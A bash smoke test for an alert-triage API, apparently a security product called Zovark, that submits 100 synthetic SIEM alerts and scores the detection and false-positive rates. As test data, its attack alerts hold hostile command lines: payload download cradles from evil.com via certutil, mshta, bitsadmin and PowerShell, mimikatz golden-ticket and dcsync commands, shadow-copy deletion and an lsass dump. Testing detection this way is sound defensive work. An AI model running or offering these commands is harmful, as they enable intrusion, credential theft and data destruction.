#!/bin/bash
# ZOVARK 100-Alert Smoke Test — API-based (the correct way)
# Submits 100 alerts through the API, waits, polls results.
#
# Audit 5.19: strict shell (set -euo pipefail), curl -fsS so HTTP errors fail
# the pipe, jq-based JSON parsing (substring grep misleads on nested fields),
# and a non-zero exit code when any assertion fails.
set -euo pipefail
MSYS_NO_PATHCONV=1

if ! command -v jq >/dev/null 2>&1; then
    echo "ERROR: jq is required but not installed (apt: jq / brew: jq)" >&2
    exit 2
fi

API="${ZOVARK_API_BASE:-http://localhost:8090}"
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

echo "=========================================="
echo "  ZOVARK 100-ALERT SMOKE TEST"
echo "  $(date)"
echo "=========================================="
echo ""

# --- Step 1: Health check ---
echo "[1/5] Health check..."
if ! READY=$(curl -fsS "$API/ready" 2>&1); then
    echo "  ERROR: /ready unreachable: $READY" >&2
    exit 1
fi
if ! echo "$READY" | jq -e '.status == "ready"' >/dev/null; then
    echo "  ERROR: API not ready: $READY" >&2
    exit 1
fi
echo "  API is ready."

# --- Step 2: Login (ONCE) ---
echo "[2/5] Authenticating..."
LOGIN_RESP=$(curl -fsS -X POST "$API/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@test.local","password":"TestPass2026"}')
TOKEN=$(echo "$LOGIN_RESP" | jq -r '.token // empty')
if [ -z "$TOKEN" ] || [ ${#TOKEN} -lt 20 ]; then
    echo "  ERROR: Login failed: $LOGIN_RESP" >&2
    exit 1
fi
echo "  Authenticated."

# --- Step 3: Define and submit 100 alerts ---
echo "[3/5] Submitting 100 alerts..."

# Function to submit an alert and save the task_id. Uses jq -n to build the
# JSON body so special characters in RAW/TITLE don't break curl.
submit() {
    local IDX=$1 TYPE=$2 SEV=$3 TITLE=$4 RULE=$5 RAW=$6 SRC_IP=$7 USER=$8 EXPECT=$9
    local RESP TID BODY
    BODY=$(jq -cn \
        --arg type "$TYPE" --arg title "$TITLE" --arg sev "$SEV" \
        --arg src "$SRC_IP" --arg u "$USER" --arg rule "$RULE" --arg raw "$RAW" \
        '{task_type: $type, input: {prompt: $title, severity: $sev, siem_event: {title: $title, source_ip: $src, username: $u, rule_name: $rule, raw_log: $raw}}}')
    if RESP=$(curl -fsS -X POST "$API/api/v1/tasks" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "$BODY" 2>&1); then
        TID=$(echo "$RESP" | jq -r '.task_id // empty' 2>/dev/null || true)
    else
        TID=""
        echo "  WARNING: Alert $IDX ($TYPE) HTTP submit failed: $(echo "$RESP" | head -c 200)" >&2
    fi
    if [ -n "$TID" ] && [ ${#TID} -gt 10 ]; then
        echo "$IDX|$TYPE|$EXPECT|$TID" >> "$TMPDIR/tasks.txt"
    else
        echo "$IDX|$TYPE|$EXPECT|SUBMIT_FAILED" >> "$TMPDIR/tasks.txt"
    fi
}

# Attack alerts (70 attacks, 30 benign)
# Brute force variants (10)
submit 1 brute_force high "SSH Brute Force" "BruteForce" "500 failed login attempts for root from 185.220.101.45 in 60 seconds via sshd" "185.220.101.45" "root" "attack"
submit 2 brute_force high "RDP Brute Force" "BruteForce" "300 failed RDP login attempts for administrator from 45.33.32.156 port 3389" "45.33.32.156" "administrator" "attack"
submit 3 brute_force high "FTP Brute Force" "BruteForce" "200 failed FTP login attempts for ftpuser from 91.215.85.12 in 120 seconds" "91.215.85.12" "ftpuser" "attack"
submit 4 brute_force high "SSH Root Spray" "BruteForce" "1000 failed password for root from 193.142.146.10 port 22 ssh2 in 300 seconds" "193.142.146.10" "root" "attack"
submit 5 brute_force high "LDAP Brute Force" "BruteForce" "400 failed LDAP bind attempts from 10.0.5.200 for cn=admin in 60 seconds" "10.0.5.200" "admin" "attack"
submit 6 brute_force high "Credential Stuffing" "BruteForce" "750 failed login attempts across 50 different usernames from 178.128.0.1" "178.128.0.1" "multiple" "attack"
submit 7 brute_force high "OWA Brute Force" "BruteForce" "600 failed OWA login attempts from 203.0.113.5 targeting admin@corp.com" "203.0.113.5" "admin" "attack"
submit 8 brute_force high "VPN Brute Force" "BruteForce" "150 failed VPN auth from 45.155.205.233 in 30 seconds using common passwords" "45.155.205.233" "vpnuser" "attack"
submit 9 brute_force high "SMB Auth Spray" "BruteForce" "800 failed SMB auth from 10.0.3.50 across 100 hosts in 60 seconds" "10.0.3.50" "DOMAIN-scanner" "attack"
submit 10 brute_force high "API Key Brute Force" "BruteForce" "1200 failed API auth from 162.159.36.1 with rotating API keys" "162.159.36.1" "api-svc" "attack"

# Phishing variants (8)
submit 11 phishing high "Phishing Email" "PhishingDetection" "From: security@micr0soft-support.com Subject: Account Verification URL: https://micr0soft-login.evil.com/verify X-Mailer: PhishKit/2.0" "10.0.0.50" "jdoe" "attack"
submit 12 phishing high "Spear Phishing" "PhishingDetection" "From: ceo@company-hr.ru Subject: Urgent Wire Transfer Attachment: invoice.pdf.exe Content-Type: application/x-msdownload" "10.0.0.51" "cfo" "attack"
submit 13 phishing high "Credential Harvest" "PhishingDetection" "From: it-support@g00gle.com Subject: Password Expiry URL: https://login.g00gle-auth.com/reset Redirect: 185.220.101.1" "10.0.0.52" "analyst1" "attack"
submit 14 phishing high "BEC Attack" "PhishingDetection" "From: ceo@cornpany.com Subject: Urgent Payment Reply-To: ceo@cornpany.com X-Originating-IP: 41.215.241.10" "10.0.0.53" "finance1" "attack"
submit 15 phishing high "Malicious Link" "PhishingDetection" "From: noreply@amaz0n-verify.com Subject: Order Confirmation URL: http://amaz0n-verify.com/track?id=malware Received: from smtp.suspicious.ru" "10.0.0.54" "user5" "attack"
submit 16 phishing high "Phishing Kit" "PhishingDetection" "From: admin@0ffice365-login.com Subject: Mailbox Full URL: https://0ffice365-login.com/upgrade X-PHP-Originating-Script: kit.php" "10.0.0.55" "user6" "attack"
submit 17 phishing high "Watering Hole" "PhishingDetection" "From: webmaster@trusted-news.com Subject: Industry Report URL: https://trusted-news.com/report.exe X-Mailer: mass-mailer/1.0" "10.0.0.56" "user7" "attack"
submit 18 phishing high "Vishing Follow-up" "PhishingDetection" "From: helpdesk@1t-support.com Subject: As Discussed on Phone URL: https://1t-support.com/remote-tool.msi Callback: 1-800-SCAM" "10.0.0.57" "user8" "attack"

# Ransomware variants (8)
submit 19 ransomware critical "Ransomware Indicators" "RansomwareDetection" "vssadmin.exe delete shadows /all /quiet encrypt.exe PID=5678 1500 files renamed to .locked extension README_DECRYPT.txt" "10.0.0.100" "SYSTEM" "attack"
submit 20 ransomware critical "Shadow Copy Delete" "RansomwareDetection" "wmic shadowcopy delete bcdedit /set recoveryenabled No 200 files encrypted with .ryuk extension" "10.0.0.101" "SYSTEM" "attack"
submit 21 ransomware critical "Mass Encryption" "RansomwareDetection" "5000 files modified in 120 seconds extensions changed to .encrypted ransom note DECRYPT_FILES.html created" "10.0.0.102" "SYSTEM" "attack"
submit 22 ransomware critical "Conti Ransomware" "RansomwareDetection" "vssadmin.exe delete shadows /all /quiet net stop VSS 3000 files renamed to .CONTI readme.txt ransom note" "10.0.0.103" "SYSTEM" "attack"
submit 23 ransomware critical "LockBit Activity" "RansomwareDetection" "vssadmin delete shadows /for=C: bcdedit /set safeboot network mass file rename to .lockbit" "10.0.0.104" "SYSTEM" "attack"
submit 24 ransomware critical "REvil Indicators" "RansomwareDetection" "wbadmin delete catalog -quiet vssadmin delete shadows /all .revil extension 800 files encrypted" "10.0.0.105" "SYSTEM" "attack"
submit 25 ransomware critical "BlackCat ALPHV" "RansomwareDetection" "fsutil usn deletejournal /D C: cipher /w:C: vssadmin delete shadows 2000 files .alphv extension" "10.0.0.106" "SYSTEM" "attack"
submit 26 ransomware critical "Maze Ransomware" "RansomwareDetection" "vssadmin.exe delete shadows /all /quiet data exfiltration 5GB uploaded then 1000 files encrypted .maze" "10.0.0.107" "SYSTEM" "attack"

# Kerberoasting (5)
submit 27 kerberoasting high "Kerberoasting SPN" "KerberoastDetect" "EventID=4769 RC4 TGS request for SPN MSSQLSvc/db01.corp.local from 10.0.0.15 EncryptionType=0x17" "10.0.0.15" "attacker1" "attack"
submit 28 kerberoasting high "Mass SPN Enum" "KerberoastDetect" "50 TGS requests for unique SPNs from 10.0.0.16 in 30 seconds EncryptionType=0x17 RC4-HMAC" "10.0.0.16" "attacker2" "attack"
submit 29 kerberoasting high "Rubeus Kerberoast" "KerberoastDetect" "EventID=4769 rubeus kerberoast SPN HTTP/web01 EncryptionType=0x17 TicketOptions=0x40810000" "10.0.0.17" "attacker3" "attack"
submit 30 kerberoasting high "Service Ticket Abuse" "KerberoastDetect" "EventID=4769 TGS for krbtgt/CORP.LOCAL from non-DC host EncryptionType=0x17 RC4 downgrade" "10.0.0.18" "attacker4" "attack"
submit 31 kerberoasting high "Targeted Kerberoast" "KerberoastDetect" "EventID=4769 TGS request MSSQLSvc/sql01:1433 from workstation WS-042 EncryptionType=0x17" "10.0.0.19" "attacker5" "attack"

# C2 / Command and Control (7)
submit 32 c2 critical "C2 Beacon" "C2Detection" "Regular beacon detected from 10.0.0.200 to 192.168.1.100:4444 interval=60s jitter=10 HTTP POST /api/beacon" "10.0.0.200" "SYSTEM" "attack"
submit 33 c2 critical "Cobalt Strike" "C2Detection" "cobalt strike beacon interval 60s callback to 185.220.100.1:443 User-Agent: Mozilla/5.0 compatible beacon" "10.0.0.201" "SYSTEM" "attack"
submit 34 c2 critical "DNS C2" "C2Detection" "High-entropy DNS queries to c2.evil.com TXT record responses avg query length 60 chars beacon pattern detected" "10.0.0.202" "SYSTEM" "attack"
submit 35 c2 critical "HTTP C2" "C2Detection" "beacon interval 30s to https://cdn-static.evil.com/pixel.gif POST data 2KB every 30s for 6 hours" "10.0.0.203" "SYSTEM" "attack"
submit 36 c2 critical "Reverse Shell" "C2Detection" "TCP connection to 45.33.32.156:4444 maintained for 3600 seconds command and control channel established" "10.0.0.204" "SYSTEM" "attack"
submit 37 c2 critical "Metasploit C2" "C2Detection" "meterpreter session established reverse_tcp 10.0.0.205:4444 beacon interval 5s stage payload delivered" "10.0.0.205" "SYSTEM" "attack"
submit 38 c2 critical "Empire C2" "C2Detection" "PowerShell Empire agent callback to 10.0.0.206:8080 interval=60 jitter=0.1 encoded stager detected" "10.0.0.206" "SYSTEM" "attack"

# Data Exfiltration (5)
submit 39 data_exfil high "Data Exfil Cloud" "DataExfil" "Large data transfer 2GB uploaded to dropbox.com from 10.0.0.30 over 4 hours off-hours upload" "10.0.0.30" "user10" "attack"
submit 40 data_exfil high "DNS Exfil" "DataExfil" "High-entropy DNS queries encoding data in subdomains to exfil.evil.com 500 queries in 10 minutes" "10.0.0.31" "SYSTEM" "attack"
submit 41 data_exfil high "USB Exfil" "DataExfil" "USB device inserted 500GB data copied to removable media E: drive after-hours access to sensitive shares" "10.0.0.32" "insider1" "attack"
submit 42 data_exfil high "HTTPS Exfil" "DataExfil" "5GB POST requests to pastebin.com from 10.0.0.33 base64 encoded data transfer over 2 hours" "10.0.0.33" "user11" "attack"
submit 43 data_exfil high "Email Exfil" "DataExfil" "500 emails with large zip attachments sent to personal gmail from 10.0.0.34 total size 3GB" "10.0.0.34" "user12" "attack"

# Lateral Movement (5)
submit 44 lateral_movement critical "PsExec Lateral" "LateralMovement" "PsExec execution from 10.0.0.40 to 10.0.0.41 using admin credentials ADMIN$ share accessed" "10.0.0.40" "admin" "attack"
submit 45 lateral_movement critical "WMI Lateral" "LateralMovement" "wmic /node:10.0.0.42 process call create cmd.exe remote process execution detected" "10.0.0.40" "admin" "attack"
submit 46 lateral_movement critical "SMB Share" "LateralMovement" "SMB connection to 10.0.0.43 C$ admin share access from 10.0.0.40 lateral movement detected" "10.0.0.40" "admin" "attack"
submit 47 lateral_movement critical "RDP Pivot" "LateralMovement" "RDP session from 10.0.0.40 to 10.0.0.44 using stolen credentials EventID=4624 LogonType=10" "10.0.0.40" "admin" "attack"
submit 48 lateral_movement critical "SSH Lateral" "LateralMovement" "SSH connection from 10.0.0.40 to 10.0.0.45 scp sensitive_data.tar.gz lateral file transfer" "10.0.0.40" "root" "attack"

# Golden Ticket (3)
submit 49 golden_ticket critical "Golden Ticket" "GoldenTicketDetect" "EventID=4769 TGT with abnormal lifetime 10 years forged krbtgt ticket from non-DC 10.0.0.50" "10.0.0.50" "attacker" "attack"
submit 50 golden_ticket critical "Forged TGT" "GoldenTicketDetect" "Kerberos TGT lifetime exceeds policy 87600h from workstation WS-050 krbtgt hash suspected compromise" "10.0.0.51" "attacker" "attack"
submit 51 golden_ticket critical "Mimikatz Golden" "GoldenTicketDetect" "mimikatz kerberos::golden /domain:corp.local /sid:S-1-5-21 /krbtgt:hash /user:admin forged TGT detected" "10.0.0.52" "attacker" "attack"

# DCSSync (3)
submit 52 dcsync critical "DCSync Attack" "DCSyncDetect" "Directory replication from non-DC host 10.0.0.60 DS-Replication-Get-Changes EventID=4662" "10.0.0.60" "attacker" "attack"
submit 53 dcsync critical "Impacket DCSync" "DCSyncDetect" "secretsdump.py NTDS.DIT replication from 10.0.0.61 GetNCChanges MS-DRSR from non-domain-controller" "10.0.0.61" "attacker" "attack"
submit 54 dcsync critical "Mimikatz DCSync" "DCSyncDetect" "mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt from workstation WS-061 non-DC replication" "10.0.0.62" "attacker" "attack"

# LOLBin Abuse (4)
submit 55 lolbin_abuse high "Certutil Download" "LOLBinDetect" "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe download cradle" "10.0.0.70" "user20" "attack"
submit 56 lolbin_abuse high "Mshta Exec" "LOLBinDetect" "mshta http://evil.com/payload.hta vbscript execution via mshta.exe LOLBin abuse detected" "10.0.0.71" "user21" "attack"
submit 57 lolbin_abuse high "BITSAdmin" "LOLBinDetect" "bitsadmin /transfer job /download /priority high http://evil.com/mal.exe mal.exe" "10.0.0.72" "user22" "attack"
submit 58 lolbin_abuse high "Rundll32 Abuse" "LOLBinDetect" "rundll32.exe javascript:eval(payload) script execution via rundll32 LOLBin technique" "10.0.0.73" "user23" "attack"

# DNS Exfiltration (3)
submit 59 dns_exfiltration high "DNS Exfil Tunnel" "DNSExfil" "High-entropy DNS queries avg 45 chars to tunnel.evil.com 1000 TXT record queries in 5 minutes" "10.0.0.80" "SYSTEM" "attack"
submit 60 dns_exfiltration high "DNS Data Leak" "DNSExfil" "DNS queries encoding hex data in subdomain labels to exfil.evil.com entropy 4.5 bits/char 500 queries" "10.0.0.81" "SYSTEM" "attack"
submit 61 dns_exfiltration high "DNS Covert Channel" "DNSExfil" "Iodine DNS tunnel detected queries to t.evil.com NULL record type avg query 60 chars bidirectional" "10.0.0.82" "SYSTEM" "attack"

# Process Injection (3)
submit 62 process_injection critical "CreateRemoteThread" "ProcessInjection" "CreateRemoteThread into lsass.exe from unknown.exe PID=1234 target PID=789 suspicious DLL injection" "10.0.0.90" "SYSTEM" "attack"
submit 63 process_injection critical "Process Hollowing" "ProcessInjection" "NtMapViewOfSection process hollowing detected svchost.exe spawned with suspicious memory regions" "10.0.0.91" "SYSTEM" "attack"
submit 64 process_injection critical "DLL Injection" "ProcessInjection" "LoadLibrary injection into explorer.exe from malware.exe CreateRemoteThread WriteProcessMemory" "10.0.0.92" "SYSTEM" "attack"

# PowerShell Obfuscation (3)
submit 65 powershell_obfuscation high "Encoded PS" "PowerShellDetect" "powershell.exe -encodedcommand SQBFAFgAIAAoACcAaAB0AHQAcAA IEX download cradle base64 encoded" "10.0.0.95" "user30" "attack"
submit 66 powershell_obfuscation high "PS Download Cradle" "PowerShellDetect" "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') IEX cradle" "10.0.0.96" "user31" "attack"
submit 67 powershell_obfuscation high "PS Obfuscated" "PowerShellDetect" "powershell -enc base64payload Set-Variable -Name x Invoke-WebRequest -Uri http://c2.evil.com/stage2" "10.0.0.97" "user32" "attack"

# DLL Sideloading (2)
submit 68 dll_sideloading high "DLL Sideload" "DLLSideload" "Unsigned DLL loaded by legitimate process from Users Public Downloads malicious.dll sideloading" "10.0.0.85" "user25" "attack"
submit 69 dll_sideloading high "DLL Hijack" "DLLSideload" "DLL search order hijack version.dll loaded from temp directory instead of System32 unsigned" "10.0.0.86" "user26" "attack"

# Credential Access (2)
submit 70 credential_access critical "LSASS Dump" "CredentialAccess" "procdump.exe -ma lsass.exe lsass_dump.dmp credential dumping from 10.0.0.110 mimikatz sekurlsa" "10.0.0.110" "attacker" "attack"

# --- Benign alerts (30) ---
submit 71 password_change low "Password Changed" "PasswordChange" "EventID=4723 User jsmith changed password via self-service portal" "10.0.0.25" "jsmith" "benign"
submit 72 windows_update info "Windows Update" "WindowsUpdate" "WindowsUpdateClient: Installation successful KB5034441 Security Update" "10.0.0.30" "SYSTEM" "benign"
submit 73 password_change low "Password Reset" "PasswordChange" "EventID=4724 Admin reset password for user mgarcia via Active Directory" "10.0.0.25" "admin" "benign"
submit 74 windows_update info "Patch Tuesday" "WindowsUpdate" "WindowsUpdateClient: Cumulative Update KB5035845 installed successfully reboot pending" "10.0.0.31" "SYSTEM" "benign"
submit 75 health_check info "Health Check" "HealthCheck" "Scheduled health check completed all services responding normally" "10.0.0.1" "monitoring" "benign"
submit 76 cert_renewal info "Cert Renewed" "CertRenewal" "SSL certificate renewed for web01.corp.local valid until 2027-04-01 SHA256 fingerprint updated" "10.0.0.1" "certbot" "benign"
submit 77 backup_job info "Backup Complete" "BackupJob" "Nightly backup completed successfully 50GB compressed to storage01 duration 45 minutes" "10.0.0.2" "backup-svc" "benign"
submit 78 log_rotation info "Log Rotated" "LogRotation" "Log rotation completed for /var/log/syslog archived 7 days compressed old logs removed" "10.0.0.3" "logrotate" "benign"
submit 79 scheduled_task info "Scheduled Task" "ScheduledTask" "Scheduled task Windows Defender scan completed successfully no threats found" "10.0.0.35" "SYSTEM" "benign"
submit 80 software_update info "Software Update" "SoftwareUpdate" "Chrome updated to version 124.0.6367.91 auto-update successful on 50 workstations" "10.0.0.1" "SYSTEM" "benign"
submit 81 user_login low "Normal Login" "UserLogin" "EventID=4624 LogonType=2 User jdoe interactive logon at 09:00 from workstation WS-001" "10.0.0.40" "jdoe" "benign"
submit 82 service_restart info "Service Restart" "ServiceRestart" "IIS Application Pool DefaultAppPool recycled due to scheduled recycle time" "10.0.0.5" "SYSTEM" "benign"
submit 83 ntp_sync info "NTP Sync" "NTPSync" "NTP time synchronized with time.windows.com offset 0.003s stratum 2" "10.0.0.1" "SYSTEM" "benign"
submit 84 dhcp_lease info "DHCP Lease" "DHCPLease" "DHCP lease renewed for 10.0.0.150 MAC 00:1A:2B:3C:4D:5E lease duration 8 hours" "10.0.0.150" "dhcpsvc" "benign"
submit 85 gpo_refresh info "GPO Refresh" "GPORefresh" "Group Policy refresh completed successfully 12 policies applied no conflicts" "10.0.0.40" "SYSTEM" "benign"
submit 86 dns_cache_flush info "DNS Flush" "DNSFlush" "DNS resolver cache flushed on dc01.corp.local by administrator maintenance window" "10.0.0.1" "admin" "benign"
submit 87 av_update info "AV Update" "AVUpdate" "Windows Defender definition update to version 1.409.123.0 signature database updated" "10.0.0.40" "SYSTEM" "benign"
submit 88 system_reboot info "Reboot" "SystemReboot" "System rebooted after patch installation uptime reset previous uptime 45 days" "10.0.0.35" "SYSTEM" "benign"
submit 89 account_lockout_reset low "Lockout Reset" "AccountReset" "Account lockout reset for user rjohnson by helpdesk after password verification" "10.0.0.1" "helpdesk" "benign"
submit 90 patch_install info "Patch Install" "PatchInstall" "Security patch MS-2026-001 installed on 200 endpoints via WSUS deployment completed" "10.0.0.1" "SYSTEM" "benign"
submit 91 maintenance_window info "Maintenance" "Maintenance" "Scheduled maintenance window started database reindex and vacuum operations" "10.0.0.2" "dba" "benign"
submit 92 config_change low "Config Change" "ConfigChange" "Firewall rule updated by admin added allow rule for port 443 from 10.0.0.0/24 change ID 12345" "10.0.0.1" "admin" "benign"
submit 93 password_change low "Password Expiry" "PasswordChange" "EventID=4723 User awhite password changed due to 90-day expiry policy" "10.0.0.45" "awhite" "benign"
submit 94 windows_update info "Feature Update" "WindowsUpdate" "WindowsUpdateClient: Feature update to Windows 11 24H2 installed successfully" "10.0.0.46" "SYSTEM" "benign"
submit 95 user_login low "VPN Login" "UserLogin" "EventID=4624 LogonType=3 VPN connection established for user bthomas from 73.162.58.100" "73.162.58.100" "bthomas" "benign"
submit 96 scheduled_task info "Cleanup Task" "ScheduledTask" "Scheduled task disk cleanup completed freed 15GB on C: drive" "10.0.0.47" "SYSTEM" "benign"
submit 97 backup_job info "SQL Backup" "BackupJob" "SQL Server backup completed for database production_db full backup 120GB duration 30 minutes" "10.0.0.2" "sqlsvc" "benign"
submit 98 service_restart info "Apache Restart" "ServiceRestart" "Apache httpd graceful restart completed configuration reload no downtime" "10.0.0.6" "root" "benign"
submit 99 software_update info "Java Update" "SoftwareUpdate" "Java Runtime updated from 21.0.1 to 21.0.3 on 30 application servers" "10.0.0.1" "SYSTEM" "benign"
submit 100 health_check info "Cluster Health" "HealthCheck" "Kubernetes cluster health check all 12 nodes ready 95 pods running 0 pending" "10.0.0.1" "k8s-health" "benign"

TOTAL=$(wc -l < "$TMPDIR/tasks.txt")
SUBMITTED=$(grep -v "SUBMIT_FAILED" "$TMPDIR/tasks.txt" | wc -l)
FAILED_SUBMIT=$((TOTAL - SUBMITTED))
echo "  Submitted: $SUBMITTED / $TOTAL"
if [ "$FAILED_SUBMIT" -gt 0 ]; then
    echo "  Failed to submit: $FAILED_SUBMIT"
fi

# --- Step 4: Wait for completion ---
echo "[4/5] Waiting 120 seconds for investigations to complete..."
sleep 120

# --- Step 5: Poll results ---
echo "[5/5] Polling results..."

PASS=0
FAIL=0
PENDING=0
ATTACK_PASS=0
ATTACK_FAIL=0
BENIGN_PASS=0
BENIGN_FAIL=0

echo "" > "$TMPDIR/results.txt"

while IFS='|' read -r IDX TYPE EXPECT TID; do
    if [ "$TID" = "SUBMIT_FAILED" ]; then
        printf "%-4s %-25s | %-7s | SUBMIT_FAILED\n" "$IDX." "$TYPE" "$EXPECT" >> "$TMPDIR/results.txt"
        FAIL=$((FAIL + 1))
        if [ "$EXPECT" = "attack" ]; then ATTACK_FAIL=$((ATTACK_FAIL + 1)); else BENIGN_FAIL=$((BENIGN_FAIL + 1)); fi
        continue
    fi

    if ! RAW=$(curl -fsS "$API/api/v1/tasks/$TID" -H "Authorization: Bearer $TOKEN" 2>&1); then
        printf "%-4s %-25s | %-7s | POLL_FAILED\n" "$IDX." "$TYPE" "$EXPECT" >> "$TMPDIR/results.txt"
        FAIL=$((FAIL + 1))
        if [ "$EXPECT" = "attack" ]; then ATTACK_FAIL=$((ATTACK_FAIL + 1)); else BENIGN_FAIL=$((BENIGN_FAIL + 1)); fi
        continue
    fi
    STATUS=$(echo "$RAW" | jq -r '.status // ""')
    # jq 'first non-null verdict / risk_score in top-level or output blob'
    VERDICT=$(echo "$RAW" | jq -r '.output.verdict // .verdict // ""')
    RISK=$(echo "$RAW" | jq -r '.output.risk_score // .risk_score // empty')

    if [ "$STATUS" != "completed" ]; then
        printf "%-4s %-25s | %-7s | PENDING (status=%s)\n" "$IDX." "$TYPE" "$EXPECT" "$STATUS" >> "$TMPDIR/results.txt"
        PENDING=$((PENDING + 1))
        FAIL=$((FAIL + 1))
        if [ "$EXPECT" = "attack" ]; then ATTACK_FAIL=$((ATTACK_FAIL + 1)); else BENIGN_FAIL=$((BENIGN_FAIL + 1)); fi
        continue
    fi

    MARK="FAIL"
    if [ "$EXPECT" = "attack" ]; then
        if [ "$VERDICT" != "benign" ] && [ -n "$RISK" ] && [ "$RISK" -ge 50 ] 2>/dev/null; then
            MARK="PASS"
            PASS=$((PASS + 1))
            ATTACK_PASS=$((ATTACK_PASS + 1))
        else
            FAIL=$((FAIL + 1))
            ATTACK_FAIL=$((ATTACK_FAIL + 1))
        fi
    else
        if [ "$VERDICT" = "benign" ] || ([ -n "$RISK" ] && [ "$RISK" -le 20 ] 2>/dev/null); then
            MARK="PASS"
            PASS=$((PASS + 1))
            BENIGN_PASS=$((BENIGN_PASS + 1))
        else
            FAIL=$((FAIL + 1))
            BENIGN_FAIL=$((BENIGN_FAIL + 1))
        fi
    fi

    printf "%-4s %-25s | %-7s | verdict=%-18s risk=%-4s | %s\n" "$IDX." "$TYPE" "$EXPECT" "$VERDICT" "$RISK" "$MARK" >> "$TMPDIR/results.txt"
done < "$TMPDIR/tasks.txt"

# --- Print results ---
echo ""
echo "=========================================="
echo "  DETAILED RESULTS"
echo "=========================================="
cat "$TMPDIR/results.txt"

echo ""
echo "=========================================="
echo "  ZOVARK 100-ALERT SMOKE TEST SUMMARY"
echo "=========================================="
echo ""
echo "  Total:       $((PASS + FAIL)) alerts"
echo "  Passed:      $PASS"
echo "  Failed:      $FAIL"
echo "  Pending:     $PENDING"
echo ""
echo "  Attacks:     $ATTACK_PASS / $((ATTACK_PASS + ATTACK_FAIL)) detected"
echo "  Benign:      $BENIGN_PASS / $((BENIGN_PASS + BENIGN_FAIL)) correct"
echo ""
DETECTION_RATE=0
if [ $((ATTACK_PASS + ATTACK_FAIL)) -gt 0 ]; then
    DETECTION_RATE=$((ATTACK_PASS * 100 / (ATTACK_PASS + ATTACK_FAIL)))
fi
FP_RATE=0
if [ $((BENIGN_PASS + BENIGN_FAIL)) -gt 0 ]; then
    FP_RATE=$((BENIGN_FAIL * 100 / (BENIGN_PASS + BENIGN_FAIL)))
fi
echo "  Detection Rate:     ${DETECTION_RATE}%"
echo "  False Positive Rate: ${FP_RATE}%"
echo ""
echo "=========================================="

# Audit 5.19: exit non-zero if anything failed, so CI correctly fails the job.
if [ "$FAIL" -gt 0 ]; then
    echo "FAILED: $FAIL alerts did not meet expected verdict/risk." >&2
    exit 1
fi
exit 0
